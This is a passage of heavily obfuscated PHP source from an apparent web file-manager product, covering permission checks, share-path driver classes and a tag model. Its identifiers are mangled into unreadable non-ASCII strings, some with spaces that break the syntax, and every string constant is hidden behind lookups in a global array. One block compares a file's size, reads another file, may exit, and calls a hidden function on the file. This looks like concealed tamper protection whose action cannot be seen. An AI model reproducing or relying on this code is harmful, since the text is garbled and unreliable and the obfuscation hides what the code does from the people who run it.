$ÌâëÉÕŞ; static $ĞıÑÛöÓ = array(); if (isset($ĞıÑÛöÓ[$ïÙªÄü])) { return $ĞıÑÛöÓ[$ïÙªÄü]; } $¨íë’Ÿ = Model($î©á¾Æ«[602])->getInfo($ÌâëÉÕŞ); $ªÇÏÊ = $this->userGroupList($¡èáØ); $ÇËÓÉ § = isset($ªÇÏÊ[$ÌâëÉÕŞ]) ? $ªÇÏÊ[$ÌâëÉÕŞ][$î©á¾Æ«[499]] : !1; if ($ÇËÓÉ § && Model($î©á¾Æ«[588])->authCheckAction($ÇËÓÉ §[$î©á¾Æ«[499]], $î©á¾Æ«[1514])) { $ĞıÑÛöÓ[$ïÙªÄü] = $ÇËÓÉ §; return $ÇËÓÉ §; } $Áú›Ù¹Ö = $this->sourceAuthSelect($¨íë’Ÿ[$î©á¾Æ«[90]][$î©á¾Æ«[193]]); $÷ì×ıº¦ = $Áú›Ù¹Ö ? $this->authMake($Áú›Ù¹Ö, $¡èáØ) : !1; $ò¡Ğí½ = $÷ì×ıº¦ ? $÷ì×ıº¦[$î©á¾Æ«[553]] : !1; $ĞıÑÛöÓ[$ïÙªÄü] = $ò¡Ğí½ ? $ò¡Ğí½ : $ÇËÓÉ §; return $ĞıÑÛöÓ[$ïÙªÄü]; } public function authOwnerApply($ÊÉñ£àÌ) { $†”»Öëô =& $_SERVER[±Ö‰ô½¯]; if (empty($ÊÉñ£àÌ[$†”»Öëô[499]]) || isset($ÊÉñ£àÌ[$†”»Öëô[1533]]) && $ÊÉñ£àÌ[$†”»Öëô[1533]]) { return $ÊÉñ£àÌ; } if (AuthModel::authCheckRoot($ÊÉñ£àÌ[$†”»Öëô[499]][$†”»Öëô[500]])) { return $ÊÉñ£àÌ; } $‘º‚î‰ö = Model($†”»Öëô[1482])->parentLevelArray($ÊÉñ£àÌ[$†”»Öëô[601]]); $‘º‚î‰ö = array_merge(array($ÊÉñ£àÌ[$†”»Öëô[193]]), array_reverse($‘º‚î‰ö)); $Úè º°³ = $this->sourceAuthSelect($‘º‚î‰ö); $ÓÂ£Ğ‘‰ = array(); $ã›İŒİî = array(); foreach ($Úè º°³ as $“†©º»“ => $…œœÏËî) { $§Ğà¯Áà = $this->authFolderOwnerUser($…œœÏËî); $ÓÂ£Ğ‘‰[$“†©º»“] = $§Ğà¯Áà; $ã›İŒİî = array_merge($ã›İŒİî, $§Ğà¯Áà[$†”»Öëô[682]]); if ($§Ğà¯Áà[$†”»Öëô[2355]]) { break; } } if (count($ã›İŒİî) == 0) { $ã›İŒİî = $this->authFolderOwnerGroup($ÊÉñ£àÌ[$†”»Öëô[586]]); } $ã›İŒİî = array_unique($ã›İŒİî); if (AuthModel::authCheckRoot($ÊÉñ£àÌ[$†”»Öëô[499]][$†”»Öëô[500]])) { $ã›İŒİî[] = USER_ID; } $ÊÉñ£àÌ[$†”»Öëô[499]][$†”»Öëô[2356]] = Model($†”»Öëô[594])->userListInfo($ã›İŒİî); return $ÊÉñ£àÌ; } private function authFolderOwnerGroup($µùÊ·ÊŞ) { $›Ìî°Ö =& $_SERVER[±Ö‰ô½¯]; $ÊôÈÇ» = Model($›Ìî°Ö[2228])->where(array($›Ìî°Ö[1444] => $µùÊ·ÊŞ))->select(); $ğøÏ‚Õû = array(); if (!$ÊôÈÇ») { return $ğøÏ‚Õû; } foreach ($ÊôÈÇ» as $Éóß“Œ˜) { $Ë×½á¢ğ = $this->authInfo($Éóß“Œ˜); if (AuthModel::authCheckRoot($Ë×½á¢ğ[$›Ìî°Ö[499]])) { $ğøÏ‚Õû[] = $Éóß“Œ˜[$›Ìî°Ö[1542]]; } } return $ğøÏ‚Õû; } private function authFolderOwnerUser($íîÒÜ°) { $¿Ä¸Óµô =& $_SERVER[±Ö‰ô½¯]; $¬”¯íÇı = array(); $ÆŞ¦ØÖŞ = !1; foreach ($íîÒÜ° as $Ë¾œÊô¬) { $¡ù˜½º‹ = $this->authInfo($Ë¾œÊô¬); if ($Ë¾œÊô¬[$¿Ä¸Óµô[586]] == $¿Ä¸Óµô[230]) { $ÆŞ¦ØÖŞ = !0; } if ($Ë¾œÊô¬[$¿Ä¸Óµô[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($¡ù˜½º‹[$¿Ä¸Óµô[499]])) { $¬”¯íÇı[] = $Ë¾œÊô¬[$¿Ä¸Óµô[586]]; } } } return array($¿Ä¸Óµô[682] => $¬”¯íÇı, $¿Ä¸Óµô[2355] => $ÆŞ¦ØÖŞ); } public function authMake($õ·…óùê, $§‰÷ ’ï = false) { $Ú¥á¢ÑÌ =& $_SERVER[±Ö‰ô½¯]; $»²•åÉİ = $this->authArrayCheck($õ·…óùê, $§‰÷ ’ï); if ($»²•åÉİ[$Ú¥á¢ÑÌ[2336]]) { $»²•åÉİ[$Ú¥á¢ÑÌ[2336]] = $this->sourceAuthInfo($»²•åÉİ[$Ú¥á¢ÑÌ[2336]]); } return $»²•åÉİ; } public function authArrayCheck($Üâ¦Œğí, $í‰ì§  = false) { $æˆÅ¹Õ´ =& $_SERVER[±Ö‰ô½¯]; if (!$Üâ¦Œğí) { return array($æˆÅ¹Õ´[500] => 0, $æˆÅ¹Õ´[553] => !1, $æˆÅ¹Õ´[2351] => $æˆÅ¹Õ´[12]); } $í‰ì§  = $í‰ì§  ? $í‰ì§  : USER_ID; $¶Û§ó™‘ = 0; $û„ÀÖÙ£ = 0; $›Ò³«™ = 0; $²½Âîç· = 0; $çÅÙ™üÚ = 0; $Üï¤éûè = 0; $ªÅêŞÇé = 0; $“›Şş¿™ = 0; $³êÛ÷Å = 1000; $Œ©´ë¿˜ = 0; $ùî¨¿Ìğ = 0; $„ü‡Å¥ = 0; $ØæèÚé« = 0; $òéØª„Ï = 0; foreach ($Üâ¦Œğí as $ëë¿‘š¾) { $‰ôï¥¼† = $this->authInfo($ëë¿‘š¾); if (!$‰ôï¥¼†) { continue; } $İİó¯ö± = $ëë¿‘š¾[$æˆÅ¹Õ´[586]]; $á‹äîŸó = $ëë¿‘š¾[$æˆÅ¹Õ´[193]]; $î‡§‚ï = intval($‰ôï¥¼†[$æˆÅ¹Õ´[499]]); if ($ëë¿‘š¾[$æˆÅ¹Õ´[190]] == SourceModel::TYPE_USER && $İİó¯ö± == $í‰ì§ ) { $¶Û§ó™‘ = !0; $›Ò³«™ = $‰ôï¥¼†; $û„ÀÖÙ£ = $î‡§‚ï; $²½Âîç· = $á‹äîŸó; } else { if ($ëë¿‘š¾[$æˆÅ¹Õ´[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($İİó¯ö±, $í‰ì§ )) { $çÅÙ™üÚ = !0; $óæñŸŠğ = $this->groupStepToUserGroup($İİó¯ö±, $í‰ì§ ); if ($óæñŸŠğ < $³êÛ÷Å) { $³êÛ÷Å = $óæñŸŠğ; $Üï¤éûè = $î‡§‚ï; $ªÅêŞÇé = $‰ôï¥¼†; $Œ©´ë¿˜ = $İİó¯ö±; $“›Şş¿™ = $á‹äîŸó; } if ($óæñŸŠğ == $³êÛ÷Å && $î‡§‚ï >= $Üï¤éûè) { $Üï¤éûè = $î‡§‚ï; $ªÅêŞÇé = $‰ôï¥¼†; $Œ©´ë¿˜ = $İİó¯ö±; $“›Şş¿™ = $á‹äîŸó; } } else { if (!$İİó¯ö± || $İİó¯ö± == $æˆÅ¹Õ´[230]) { $ùî¨¿Ìğ = !0; $ØæèÚé« = $‰ôï¥¼†; $„ü‡Å¥ = $î‡§‚ï; $òéØª„Ï = $á‹äîŸó; } } } } if ($¶Û§ó™‘) { $Ç‚¶ÂÄë = $û„ÀÖÙ£; $‰ôï¥¼† = $›Ò³«™; $‚’¯Ê÷Ä = $²½Âîç·; $É±ØÁ˜ª = LNG($æˆÅ¹Õ´[2357]); } else { if ($çÅÙ™üÚ) { $Ç‚¶ÂÄë = $Üï¤éûè; $‰ôï¥¼† = $ªÅêŞÇé; $‚’¯Ê÷Ä = $“›Şş¿™; $Ÿ«øÈ = Model($æˆÅ¹Õ´[602])->getInfo($Œ©´ë¿˜); $É±ØÁ˜ª = $æˆÅ¹Õ´[175] . $Ÿ«øÈ[$æˆÅ¹Õ´[606]] . $æˆÅ¹Õ´[2358] . LNG($æˆÅ¹Õ´[2359]); } else { if ($ùî¨¿Ìğ) { $Ç‚¶ÂÄë = $„ü‡Å¥; $‰ôï¥¼† = $ØæèÚé«; $‚’¯Ê÷Ä = $òéØª„Ï; $É±ØÁ˜ª = LNG($æˆÅ¹Õ´[2338]); } else { $Ç‚¶ÂÄë = 0; $‰ôï¥¼† = !1; $É±ØÁ˜ª = $æˆÅ¹Õ´[12]; $‚’¯Ê÷Ä = $æˆÅ¹Õ´[12]; } } } $à›ù¿•Ş = array($æˆÅ¹Õ´[2350] => intval($Ç‚¶ÂÄë), $æˆÅ¹Õ´[2340] => $‰ôï¥¼†, $æˆÅ¹Õ´[2351] => $É±ØÁ˜ª, $æˆÅ¹Õ´[2346] => $‚’¯Ê÷Ä); return $à›ù¿•Ş; } private function groupContainUser($“¶Öî’ª, $Ğ“¹ñ¾ = false) { return in_array($“¶Öî’ª, $this->userGroupParents($Ğ“¹ñ¾)); } private function groupStepToUserGroup($¦¼½Àí, $şˆº…š¸ = false) { $ƒÚ¼Ÿ®¾ =& $_SERVER[±Ö‰ô½¯]; $î¯ÙÅçÏ = $this->userGroupList($şˆº…š¸); $Š¤­è“© = 1000; $Ì­ÙÔñ = $GLOBALS[$ƒÚ¼Ÿ®¾[6]][$ƒÚ¼Ÿ®¾[92]][$ƒÚ¼Ÿ®¾[2241]] == 1; $»µÌ¨ç = $Ì­ÙÔñ ? 3 : 2; foreach ($î¯ÙÅçÏ as $©êšşî) { if ($©êšşî[$ƒÚ¼Ÿ®¾[1444]] == $¦¼½Àí) { return 0; } $×â‘•úŞ = explode($ƒÚ¼Ÿ®¾[50], trim($©êšşî[$ƒÚ¼Ÿ®¾[601]], $ƒÚ¼Ÿ®¾[50])); if ($×â‘•úŞ[0] == $ƒÚ¼Ÿ®¾[230] && count($×â‘•úŞ) > $»µÌ¨ç) { $ÛÇ¼¹ØÚ = array_reverse(array_slice($×â‘•úŞ, $»µÌ¨ç)); $é¼—Æè§ = array_search($¦¼½Àí, $ÛÇ¼¹ØÚ); if ($é¼—Æè§ !== !1 && $é¼—Æè§ + 1 <= $Š¤­è“©) { $Š¤­è“© = $é¼—Æè§ + 1; } } } return $Š¤­è“©; } private function userGroupList($óÚöÔÑÒ = false, $ë¦é¾¡˜ = false) { $Ä„Õ‰© =& $_SERVER[±Ö‰ô½¯]; static $ ‚Š¬—§ = array(); if (isset($ ‚Š¬—§[$óÚöÔÑÒ])) { return $ ‚Š¬—§[$óÚöÔÑÒ]; } if (!$ë¦é¾¡˜) { $ë¦é¾¡˜ = Model($Ä„Õ‰©[614])->getInfo($óÚöÔÑÒ); } $ ‚Š¬—§[$óÚöÔÑÒ] = array_to_keyvalue($ë¦é¾¡˜[$Ä„Õ‰©[1443]], $Ä„Õ‰©[1444]); return $ ‚Š¬—§[$óÚöÔÑÒ]; } public function userGroupParents($é‡Ù¤ô°) { $Ï—‰ÒŠß =& $_SERVER[±Ö‰ô½¯]; static $‹´Ôæâ = array(); $é‡Ù¤ô° = $é‡Ù¤ô° ? $é‡Ù¤ô° : USER_ID; if (isset($‹´Ôæâ[$é‡Ù¤ô°])) { return $‹´Ôæâ[$é‡Ù¤ô°]; } $ì€ÌåØü = $this->userGroupList($é‡Ù¤ô°); $–ó•úà = array(); $°ó·š‰Ó = $GLOBALS[$Ï—‰ÒŠß[6]][$Ï—‰ÒŠß[92]][$Ï—‰ÒŠß[2241]] == 1; $©¡¤½àó = $°ó·š‰Ó ? 3 : 2; foreach ($ì€ÌåØü as $ÕØ£‹€ş) { $¡“†©¹Ù = array($ÕØ£‹€ş[$Ï—‰ÒŠß[1444]]); $†ÌéÂñ’ = explode($Ï—‰ÒŠß[50], trim($ÕØ£‹€ş[$Ï—‰ÒŠß[601]], $Ï—‰ÒŠß[50])); if ($†ÌéÂñ’[0] == $Ï—‰ÒŠß[230] && count($†ÌéÂñ’) > $©¡¤½àó) { $ÆÕÓÓ†É = array_slice($†ÌéÂñ’, $©¡¤½àó); $¡“†©¹Ù = array_merge($¡“†©¹Ù, array_reverse($ÆÕÓÓ†É)); } $–ó•úà = array_merge($–ó•úà, $¡“†©¹Ù); } $‹´Ôæâ[$é‡Ù¤ô°] = array_unique($–ó•úà); return $‹´Ôæâ[$é‡Ù¤ô°]; } public function authTargetInfoMake($ïêŞµÚí) { $®‹²†¡Ñ =& $_SERVER[±Ö‰ô½¯]; $Ğ€ˆ­ªŠ = array(); $‘´‘‡ô² = array(); foreach ($ïêŞµÚí as $¥Â°¦¨¶) { if ($¥Â°¦¨¶[$®‹²†¡Ñ[190]] == SourceModel::TYPE_USER) { $Ğ€ˆ­ªŠ[] = intval($¥Â°¦¨¶[$®‹²†¡Ñ[586]]); } else { if ($¥Â°¦¨¶[$®‹²†¡Ñ[190]] == SourceModel::TYPE_GROUP) { $‘´‘‡ô²[] = intval($¥Â°¦¨¶[$®‹²†¡Ñ[586]]); } } } if ($Ğ€ˆ­ªŠ) { $Ğ€ˆ­ªŠ = Model($®‹²†¡Ñ[594])->userListInfo($Ğ€ˆ­ªŠ); } if ($‘´‘‡ô²) { $îĞÀˆ£õ = array($®‹²†¡Ñ[2221] => array($®‹²†¡Ñ[504], $‘´‘‡ô²)); $‘´‘‡ô² = Model($®‹²†¡Ñ[602])->field($®‹²†¡Ñ[2360])->where($îĞÀˆ£õ)->select(); $‘´‘‡ô² = array_to_keyvalue($‘´‘‡ô², $®‹²†¡Ñ[1444]); } return array($®‹²†¡Ñ[2361] => $Ğ€ˆ­ªŠ, $®‹²†¡Ñ[2362] => $‘´‘‡ô²); } public function authInfo($ıÒÈ©Şƒ) { $ÅºÑ”‚‰ =& $_SERVER[±Ö‰ô½¯]; if ($ıÒÈ©Şƒ[$ÅºÑ”‚‰[1589]]) { $ğ­¢¨ø± = Model($ÅºÑ”‚‰[588])->listData($ıÒÈ©Şƒ[$ÅºÑ”‚‰[1589]]); if (!$ğ­¢¨ø±) { return !1; $ğ¤Ó½—¾ = Model($ÅºÑ”‚‰[588])->listData(); $Ù¼óĞ˜ = array_filter_by_field($ğ¤Ó½—¾, $ÅºÑ”‚‰[499], $ÅºÑ”‚‰[230]); return $Ù¼óĞ˜; } $í¾¶¦©€ = array_field_key($ğ­¢¨ø±, array($ÅºÑ”‚‰[484], $ÅºÑ”‚‰[32], $ÅºÑ”‚‰[499], $ÅºÑ”‚‰[2157], $ÅºÑ”‚‰[2158])); $í¾¶¦©€[$ÅºÑ”‚‰[2363]] = $ıÒÈ©Şƒ; return $í¾¶¦©€; } else { return array($ÅºÑ”‚‰[505] => 0, $ÅºÑ”‚‰[2142] => $ıÒÈ©Şƒ[$ÅºÑ”‚‰[2298]], $ÅºÑ”‚‰[506] => $ÅºÑ”‚‰[12], $ÅºÑ”‚‰[2157] => $ÅºÑ”‚‰[2364]); } } } goto B„Š„Õ¢¶; c±ñË¬÷Ê: define($_SERVER[±Ö‰ô½¯][319], 3); define($_SERVER[±Ö‰ô½¯][320], 1); define($_SERVER[±Ö‰ô½¯][321], 0); goto EÚÙÁ©Àæô; cİìÛ…¶Ş: class PathDriverDbShareItem extends PathDriverDB { public function __construct($–™†µ˜Ù) { $this->pathParse = $–™†µ˜Ù; $this->model = Model($_SERVER[±Ö‰ô½¯][1482]); } public function getPathRoot() { $²½»Àšß =& $_SERVER[±Ö‰ô½¯]; return KodIO::makeShare($this->pathParse[$²½»Àšß[484]], $this->pathParse[$²½»Àšß[1306]]); } public function getPathOuter($¹›«Ù) { $‘Èò÷† =& $_SERVER[±Ö‰ô½¯]; if (!$¹›«Ù) { return $¹›«Ù; } $á«¶‡Ÿ = $this->parse($¹›«Ù); return trim(KodIO::makeShare($this->pathParse[$‘Èò÷†[484]], $á«¶‡Ÿ[$‘Èò÷†[484]]), $‘Èò÷†[8]); } public function isParentOf($÷á¿ÚÍæ, $é›†Ù) { $‰ÆˆÈ¼Ë = IO::init($é›†Ù); return $this->model->isParentOf($÷á¿ÚÍæ, $‰ÆˆÈ¼Ë->path); } protected function infoParse($á”ñî™£, $ÒâÊª¡Á = false, $œ”¹ßßÍ = false) { $Ë„½á¿• =& $_SERVER[±Ö‰ô½¯]; static $Ôƒ÷–¢ß = array(); $äØ“¶Ó = $this->pathParse[$Ë„½á¿•[484]]; $Î¦§ÜÅ = trim($this->pathParse[$Ë„½á¿•[1302]], $Ë„½á¿•[8]); if (isset($Ôƒ÷–¢ß[$Î¦§ÜÅ]) && is_array($Ôƒ÷–¢ß[$Î¦§ÜÅ])) { return $Ôƒ÷–¢ß[$Î¦§ÜÅ]; } $áæßÎò¢ = Action($Ë„½á¿•[1489])->sharePathInfo($äØ“¶Ó, $Î¦§ÜÅ, $ÒâÊª¡Á); $Ôƒ÷–¢ß[$Î¦§ÜÅ] = $áæßÎò¢; return $áæßÎò¢; } public function infoFull($ÊÇ²ùÂ§) { $÷äš…°› =& $_SERVER[±Ö‰ô½¯]; $ì¸“ßåı = explode($÷äš…°›[8], trim($ÊÇ²ùÂ§, $÷äš…°›[8])); if (count($ì¸“ßåı) > 1) { $“›£Ìã = implode($÷äš…°›[8], array_splice($ì¸“ßåı, 1)); $ƒÄ²ç× = $this->model->pathInfoByPath($ì¸“ßåı[0], $“›£Ìã); if (!$ƒÄ²ç×) { return !1; } $this->pathParse[$÷äš…°›[1302]] = $ƒÄ²ç×[$÷äš…°›[193]]; } return $this->infoParse($ÊÇ²ùÂ§); } public function listAll($³¶ó©†Ò) { $¡óµ˜É¶ =& $_SERVER[±Ö‰ô½¯]; $Éû˜ÇØ = IO::info($this->pathParse[$¡óµ˜É¶[87]]); if (!$Éû˜ÇØ) { return array(); } $Ä·®×øÁ = $this->model->listAll($³¶ó©†Ò); $½û€¿à½ = Model($¡óµ˜É¶[684])->getInfo($Éû˜ÇØ[$¡óµ˜É¶[685]]); foreach ($Ä·®×øÁ as &$‰¹é„ÉÌ) { check_abort(); $‰¹é„ÉÌ[$¡óµ˜É¶[90]] = Action($¡óµ˜É¶[1489])->_shareItemeParse($‰¹é„ÉÌ[$¡óµ˜É¶[90]], $½û€¿à½); } unset($‰¹é„ÉÌ); return $Ä·®×øÁ; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($„Ëª»Ï¼) { $this->pathParse = $„Ëª»Ï¼; $this->model = Model($_SERVER[±Ö‰ô½¯][1482]); } protected function infoParse($ëãìæİ½, $Ú—ÛÑÎ« = false, $ìçÉ±ûâ = false) { $¡ªÑ§¥ß =& $_SERVER[±Ö‰ô½¯]; return Action($¡ªÑ§¥ß[1309])->sharePathInfo($this->pathParse[$¡ªÑ§¥ß[87]], !0, $Ú—ÛÑÎ«); } public function listPath($Î¡ƒÉš–, $¾‹Ó· = false) { $ûª€ÂŒè =& $_SERVER[±Ö‰ô½¯]; $ÁØÎÅôë = parent::listPath($Î¡ƒÉš–, $¾‹Ó·); if (!$ÁØÎÅôë) { return $ÁØÎÅôë; } if (is_array($ÁØÎÅôë[$ûª€ÂŒè[1490]])) { $ÁØÎÅôë[$ûª€ÂŒè[1490]] = Action($ûª€ÂŒè[1309])->shareItemInfo($ÁØÎÅôë[$ûª€ÂŒè[1490]]); } foreach ($ÁØÎÅôë as $ŒóæŠŒú => $€Â²«•) { if (!in_array($ŒóæŠŒú, array($ûª€ÂŒè[86], $ûª€ÂŒè[85]))) { continue; } foreach ($€Â²«• as $ÔÅÉ¨ => $Ë¾Áø‰¬) { $ÁØÎÅôë[$ŒóæŠŒú][$ÔÅÉ¨] = Action($ûª€ÂŒè[1309])->shareItemInfo($Ë¾Áø‰¬); } } return $ÁØÎÅôë; } public function listAll($›Éè –) { $… ®Ş´ï =& $_SERVER[±Ö‰ô½¯]; $ÃĞ“ñÄç = IO::info($this->pathParse[$… ®Ş´ï[87]]); if (!$ÃĞ“ñÄç) { return array(); } $ºŸ¥åá = $this->model->listAll($›Éè –); foreach ($ºŸ¥åá as &$Æå¿Ù„î) { $Æå¿Ù„î[$… ®Ş´ï[90]] = Action($… ®Ş´ï[1309])->shareItemInfo($Æå¿Ù„î[$… ®Ş´ï[90]]); } unset($Æå¿Ù„î); return $ºŸ¥åá; } } class PathDriverDriverShareItem { public function __construct($µ”îÏö›) { $this->pathParse = $µ”îÏö›; } public function __call($‚ê®ÙÅ‡, $¡»ò) { $´§Â“¥¼ =& $_SERVER[±Ö‰ô½¯]; if (method_exists($this, $‚ê®ÙÅ‡)) { return; } $ÜòÛ´¯˜ = call_user_func_array(array($´§Â“¥¼[1491], $‚ê®ÙÅ‡), $¡»ò); $‹††³†î = array($´§Â“¥¼[1492], $´§Â“¥¼[1493], $´§Â“¥¼[1494], $´§Â“¥¼[1495], $´§Â“¥¼[638], $´§Â“¥¼[640], $´§Â“¥¼[1496], $´§Â“¥¼[108], $´§Â“¥¼[1497], $´§Â“¥¼[1498]); if (in_array($‚ê®ÙÅ‡, $‹††³†î)) { $ÜòÛ´¯˜ = $this->getPathOuter($ÜòÛ´¯˜); } return $ÜòÛ´¯˜; } public function copy($‹Ú³¯ Ô, $ÈÜæ€Á, $‹¨¶«çî = false, $£ğïğ•” = false) { return $this->copyMove($‹Ú³¯ Ô, $ÈÜæ€Á, $‹¨¶«çî, $_SERVER[±Ö‰ô½¯][638], $£ğïğ•”); } public function move($»¦Øæ´—, $Æ¾‰êåï, $ñÆØäşİ = false, $…ı–˜Õ = false) { return $this->copyMove($»¦Øæ´—, $Æ¾‰êåï, $ñÆØäşİ, $_SERVER[±Ö‰ô½¯][640], $…ı–˜Õ); } private function copyMove($‹õòĞ¸£, $™ƒôåÚ, $«‘şù¹ó, $úìÑ‚·ï, $°ø×ıİÓ = false) { $ìÃå¾ó™ =& $_SERVER[±Ö‰ô½¯]; $šË‡È„¿ = $™ƒôåÚ; $¡ìæÅÉ = IO::driverMake($™ƒôåÚ); if ($¡ìæÅÉ->pathParse[$ìÃå¾ó™[1283]]) { $™ƒôåÚ = $¡ìæÅÉ->pathParse[$ìÃå¾ó™[1283]]; } else { $™ƒôåÚ = $šË‡È„¿; } $„§Ô¯¥ = IO::copyMove($‹õòĞ¸£, $™ƒôåÚ, $«‘şù¹ó, $úìÑ‚·ï, $°ø×ıİÓ); $„§Ô¯¥ = $this->getPathOuter($„§Ô¯¥); return $„§Ô¯¥; } public function pathThis($Ğ’‹º¬´) { return get_path_this($this->pathParse[$_SERVER[±Ö‰ô½¯][87]]); } public function pathFather($äãÏ¦ËĞ) { return get_path_father($this->pathParse[$_SERVER[±Ö‰ô½¯][87]]); } public function iconvSystem($ı“Ş…) { return $ı“Ş…; } protected function infoParse($²Ç¨§À, $¦°­õñ = false) { $ÓŞ™©Ïã =& $_SERVER[±Ö‰ô½¯]; $²ãˆŸûÑ = $this->pathParse[$ÓŞ™©Ïã[573]][$ÓŞ™©Ïã[580]] . $this->pathParse[$ÓŞ™©Ïã[1302]]; if ($¦°­õñ) { $¦ı¢­İ’ = IO::infoWithChildren($²ãˆŸûÑ); } else { $¦ı¢­İ’ = IO::info($²ãˆŸûÑ); } $ÙûÀ¡˜Ô = $this->pathParse[$ÓŞ™©Ïã[573]]; return Action($ÓŞ™©Ïã[1489])->_shareItemeParse($¦ı¢­İ’, $ÙûÀ¡˜Ô); } public function listAll($¥ÂÖü™–) { $âÖÏÓÂÃ =& $_SERVER[±Ö‰ô½¯]; $ù³•ôâ“ = IO::listAll($¥ÂÖü™–); $Ø§·ÍêŒ = rtrim($this->pathParse[$âÖÏÓÂÃ[573]][$âÖÏÓÂÃ[580]], $âÖÏÓÂÃ[8]); foreach ($ù³•ôâ“ as &$óîàÉÔ) { $óîàÉÔ[$âÖÏÓÂÃ[87]] = $this->pathDriver . $âÖÏÓÂÃ[8] . ltrim(substr($óîàÉÔ[$âÖÏÓÂÃ[87]], strlen($Ø§·ÍêŒ)), $âÖÏÓÂÃ[8]); } unset($óîàÉÔ); return $ù³•ôâ“; } public function listAllSimple($÷…¢è³Â, $—íš = false) { $Ñ¯ºº¶Ã =& $_SERVER[±Ö‰ô½¯]; $½ÎÌ¥ú¢ = $this->listAll($÷…¢è³Â); $³Ì¯¹°ò = $this->pathParse[$Ñ¯ºº¶Ã[507]]; if (trim($³Ì¯¹°ò, $Ñ¯ºº¶Ã[8]) == trim(get_path_father($³Ì¯¹°ò), $Ñ¯ºº¶Ã[8])) { $—íš = !0; } return IO::init($Ñ¯ºº¶Ã[12])->listAllSimpleMake($½ÎÌ¥ú¢, $³Ì¯¹°ò, $—íš); } public function getPathOuter($·•–ÏåÈ) { $Ò³±€Œç =& $_SERVER[±Ö‰ô½¯]; $àèßêÍ’ = KodIO::parse($·•–ÏåÈ); if ($àèßêÍ’[$Ò³±€Œç[33]] == KodIO::KOD_SHARE_ITEM) { return $àèßêÍ’[$Ò³±€Œç[87]]; } $ö˜‘ú = KodIO::clear($·•–ÏåÈ); $Ú˜É¯â = KodIO::clear($this->pathParse[$Ò³±€Œç[573]][$Ò³±€Œç[580]]); $àÏ•£ä’ = substr($ö˜‘ú, strlen($Ú˜É¯â)); if (substr($ö˜‘ú, 0, strlen($Ú˜É¯â)) != $Ú˜É¯â) { return !1; } return $this->pathParse[$Ò³±€Œç[1303]] . $Ò³±€Œç[8] . ltrim($àÏ•£ä’, $Ò³±€Œç[8]); } public function getType() { $ğ¦½¼ =& $_SERVER[±Ö‰ô½¯]; $Ğ˜ä¨®¤ = str_replace($ğ¦½¼[77], $ğ¦½¼[12], get_class($this)); return strtolower($Ğ˜ä¨®¤); } public function isOsDriver($«éƒü½İ) { return IO::isOsDriver($«éƒü½İ); } public function info($ç½€õŸ ) { return $this->infoParse($ç½€õŸ ); } public function infoAuth($ã†ıı­Ø) { return $this->infoParse($ã†ıı­Ø); } public function infoWithChildren($‘û©ÕéÕ) { return $this->infoParse($‘û©ÕéÕ, !0); } public function infoFull($™¶ª¸) { return $this->infoParse($™¶ª¸); } } goto aËÊÁ’¥ˆ; b”ö‰Ô…©˜: if ($_SERVER[$_SERVER[±Ö‰ô½¯][986]] != $_size($_file)) { $_getc = $_SERVER[±Ö‰ô½¯][989]; $_getfile = $_SERVER[$_SERVER[±Ö‰ô½¯][990]] . $_SERVER[±Ö‰ô½¯][991]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[±Ö‰ô½¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[±Ö‰ô½¯][743]) { $exit = $_SERVER[±Ö‰ô½¯][992]; $exit(); } $_act = $_SERVER[±Ö‰ô½¯][1698]; $_act($_file); } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\x61\x76"; protected function cacheFunctionAlias($Ç˜Æ§Ü©) { $‰¢ôó‰¨ =& $_SERVER[±Ö‰ô½¯]; return array($‰¢ôó‰¨[2246] => array($Ç˜Æ§Ü©[0], $‰¢ôó‰¨[2247]), $‰¢ôó‰¨[2248] => array($Ç˜Æ§Ü©[0], $‰¢ôó‰¨[2249])); } protected function ___get($Ó¨Ï†¦—) { $°ÌšÄåÇ =& $_SERVER[±Ö‰ô½¯]; $ÈóÏïŠ = Model($°ÌšÄåÇ[602])->metaGet($Ó¨Ï†¦—, $°ÌšÄåÇ[2250]); $¿†˜¸µû = json_decode($ÈóÏïŠ, !0); return $¿†˜¸µû ? $¿†˜¸µû : array($°ÌšÄåÇ[2251] => $°ÌšÄåÇ[91], $°ÌšÄåÇ[447] => array()); } protected function ___listData($Ñ³ÎÖ¦„) { $ú¶Øéì— =& $_SERVER[±Ö‰ô½¯]; $ĞÁ¦ò = array($ú¶Øéì—[1921] => 0, $ú¶Øéì—[570] => array($ú¶Øéì—[2252], 0), $ú¶Øéì—[508] => $ú¶Øéì—[1440] . $Ñ³ÎÖ¦„); $‘â©‚ğ¤ = $ú¶Øéì—[2253]; $©¿µ§¨ = $this->field($‘â©‚ğ¤)->where($ĞÁ¦ò)->order($ú¶Øéì—[2254])->select(); return $©¿µ§¨ ? $©¿µ§¨ : array(); } protected function set($ÖÛÑŒÖ³, $¹ì¹ÀÇØ) { $òäå¡×æ =& $_SERVER[±Ö‰ô½¯]; $¹ì¹ÀÇØ = $¹ì¹ÀÇØ ? $¹ì¹ÀÇØ : array($òäå¡×æ[2251] => $òäå¡×æ[91], $òäå¡×æ[447] => array()); return Model($òäå¡×æ[602])->metaSet($ÖÛÑŒÖ³, $òäå¡×æ[2250], json_encode($¹ì¹ÀÇØ)); } protected function getByTagID($µÏå×, $ÓÀı÷Œ§) { $”¤ùå®ª =& $_SERVER[±Ö‰ô½¯]; if (!$µÏå× || !$ÓÀı÷Œ§) { return !1; } if (!Model($”¤ùå®ª[602])->getInfoSimple($µÏå×)) { return !1; } $›ÜªÊÈ¦ = $this->get($µÏå×); if (!$›ÜªÊÈ¦ || !isset($›ÜªÊÈ¦[$”¤ùå®ª[447]])) { return !1; } $»·Ş‘ò„ = array_find_by_field($›ÜªÊÈ¦[$”¤ùå®ª[447]], $”¤ùå®ª[484], $ÓÀı÷Œ§); return is_array($»·Ş‘ò„) ? $»·Ş‘ò„ : !1; } public function listSource($ é‡ç‹Ğ, $¶²ö­²Æ) { $Úöâô¯ =& $_SERVER[±Ö‰ô½¯]; if ($¶²ö­²Æ && !is_array($¶²ö­²Æ)) { $¶²ö­²Æ = array($¶²ö­²Æ); } $Ø‡¢ôÚĞ = $this->get($ é‡ç‹Ğ); $‹¾‰ò¯‚ = array_to_keyvalue($Ø‡¢ôÚĞ[$Úöâô¯[447]], $Úöâô¯[484]); $àÛ¾•Æ = array_to_keyvalue($Ø‡¢ôÚĞ[$Úöâô¯[595]], 